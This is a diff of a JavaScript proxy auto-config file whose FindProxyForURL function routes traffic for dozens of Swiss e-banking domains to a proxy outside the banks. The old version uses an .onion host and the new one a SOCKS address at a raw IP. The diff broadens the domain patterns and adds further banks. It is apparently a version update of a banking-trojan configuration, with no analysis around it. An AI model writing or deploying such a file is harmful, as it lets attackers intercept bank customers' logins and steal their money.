@@ -1,10 +1,9 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY log5moxngjoys52g.onion:88;";
-    var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', 'eb.akb.ch',
+    var proxy = "SOCKS 31.41.44.226:88;";
+    var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
         '*.ubs.com', 'tb.raiffeisendirect.ch', '*.bkb.ch', '*.lukb.ch',
-        '*.zkb.ch', '*.onba.ch', 'e-banking.gkb.ch', '*.bekb.ch',
-        'wwwsec.ebanking.zugerkb.ch', 'netbanking.bcge.ch',
-        '*.raiffeisen.ch', '*.credit-suisse.com', '*.static-ubs.com',
+        '*.zkb.ch', '*.onba.ch', '*gkb.ch', '*.bekb.ch', '*zugerkb.ch',
+        '*bcge.ch', '*.raiffeisen.ch', '*.credit-suisse.com',
         '*.clientis.ch', 'clientis.ch', '*bcvs.ch', '*.cic.ch', 'cic.ch',
         '*baloise.ch', 'ukb.ch', '*.ukb.ch', 'urkb.ch', '*.urkb.ch',
         '*.eek.ch', '*szkb.ch', '*shkb.ch', '*glkb.ch', '*nkb.ch',
@@ -18,7 +17,10 @@ function FindProxyForURL(url, host) {
         '*regiobank.ch', '*rbm.ch', '*hbl.ch', '*ersparniskasse.ch',
         '*ekr.ch', '*sparkasse-dielsdorf.ch', '*eki.ch',
         '*bankgantrisch.ch', '*bbobank.ch', '*alpharheintalbank.ch',
-        '*aekbank.ch', '*acrevis.ch');
+        '*aekbank.ch', '*acrevis.ch', '*credinvest.ch',
+        '*bancazarattini.ch', '*appkb.ch', '*arabbank.ch', '*apbank.ch',
+        '*notenstein-laroche.ch', '*bankbiz.ch', '*bankleerau.ch',
+        '*btv3banken.ch', '*dcbank.ch', '*bordier.com');
     for (var i = 0; i < hosts.length; i++) {
         if (shExpMatch(host, hosts[i])) {
             return proxy
